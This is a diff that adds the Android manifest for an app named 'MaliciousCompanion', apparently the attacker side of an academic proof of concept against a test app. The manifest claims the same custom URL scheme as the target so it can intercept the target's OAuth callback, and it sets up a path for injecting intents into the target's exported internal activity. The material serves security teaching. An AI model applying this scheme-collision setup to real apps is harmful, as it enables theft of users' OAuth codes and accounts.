@@ -1,0 +1,57 @@
+<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+    xmlns:tools="http://schemas.android.com/tools">
+
+    <!-- Needed so we can fire an explicit Intent at the target package on
+         Android 11+ (package-visibility filtering). -->
+    <queries>
+        <package android:name="ro.upb.smd.poc.target" />
+    </queries>
+
+    <application
+        android:allowBackup="true"
+        android:dataExtractionRules="@xml/data_extraction_rules"
+        android:fullBackupContent="@xml/backup_rules"
+        android:icon="@mipmap/ic_launcher"
+        android:label="@string/app_name"
+        android:roundIcon="@mipmap/ic_launcher_round"
+        android:supportsRtl="true"
+        android:theme="@style/Theme.MaliciousCompanion">
+
+        <activity
+            android:name=".MainActivity"
+            android:exported="true">
+
+            <!-- Normal launcher entry. -->
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+
+            <!-- Scheme collision: register the same custom scheme as the
+                 vulnerable target so we can intercept its OAuth callback. -->
+            <intent-filter>
+                <action android:name="android.intent.action.VIEW" />
+                <category android:name="android.intent.category.DEFAULT" />
+                <category android:name="android.intent.category.BROWSABLE" />
+                <data
+                    android:scheme="smdpoc"
+                    android:host="oauth" />
+            </intent-filter>
+
+            <!-- Trigger path for intent-injection: when a QR carries
+                 smdpoc://internal/... we forward to the target's exported
+                 InternalActivity via an explicit intent. -->
+            <intent-filter>
+                <action android:name="android.intent.action.VIEW" />
+                <category android:name="android.intent.category.DEFAULT" />
+                <category android:name="android.intent.category.BROWSABLE" />
+                <data
+                    android:scheme="smdpoc"
+                    android:host="internal" />
+            </intent-filter>
+
+        </activity>
+    </application>
+
+</manifest>
